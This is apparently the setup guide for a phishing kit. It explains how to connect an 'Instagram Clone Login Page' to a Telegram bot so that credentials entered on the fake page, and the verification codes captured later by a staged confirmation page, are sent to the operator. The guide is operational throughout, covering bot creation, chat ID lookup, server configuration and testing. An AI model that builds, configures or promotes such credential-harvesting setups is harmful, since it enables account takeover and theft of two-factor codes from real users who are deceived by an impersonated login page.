# Setting Up Telegram Notifications

This guide will help you set up Telegram notifications for your Instagram Clone Login Page.

## Step 1: Create a Telegram Bot

1. Open Telegram and search for the "BotFather" (@BotFather).
2. Start a chat with BotFather and send the command `/newbot`.
3. Follow the instructions to create your bot. You'll be asked to provide a name and username for your bot.
4. Once created, BotFather will provide you with a **token**. This is your `TELEGRAM_BOT_TOKEN`. Save it.

## Step 2: Get Your Chat ID

1. Start a chat with your newly created bot.
2. In a separate browser tab, go to: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates` (replace `<YOUR_BOT_TOKEN>` with the token you received in Step 1).
3. Send a message to your bot.
4. Refresh the browser tab with the getUpdates URL.
5. Look for the `"chat":{"id":XXXXXXXXX` value in the response. This number is your `TELEGRAM_CHAT_ID`. Save it.

## Step 3: Update Your Server Configuration

1. Open the `server.js` file in your project.
2. Replace the placeholder values for `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` with the actual values you obtained in Steps 1 and 2:

```javascript
// Telegram Bot settings
const TELEGRAM_BOT_TOKEN = "YOUR_ACTUAL_TOKEN_HERE"; // Replace with your bot token
const TELEGRAM_CHAT_ID = "YOUR_ACTUAL_CHAT_ID_HERE"; // Replace with your chat ID
```

## Step 4: Install Dependencies and Run the Server

```bash
npm install
npm start
```

## Testing the Setup

1. Visit your Instagram Clone Login Page at `http://localhost:3000`.
2. Enter any test credentials and submit the form.
3. You should receive a notification on Telegram with the login information.
4. After 30 seconds, when the verification page appears, enter a verification code and click "Confirm".
5. You should receive another notification on Telegram with the verification code.

## Troubleshooting

If you're not receiving notifications:

1. Ensure your bot token and chat ID are correct.
2. Check that you have an internet connection.
3. Look at the server console for any error messages related to Telegram notifications.
4. Make sure you've installed the axios dependency with `npm install axios`.

## Security Note

Keep your bot token private. Anyone with your bot token can control your bot. Do not commit it to public repositories or share it publicly.
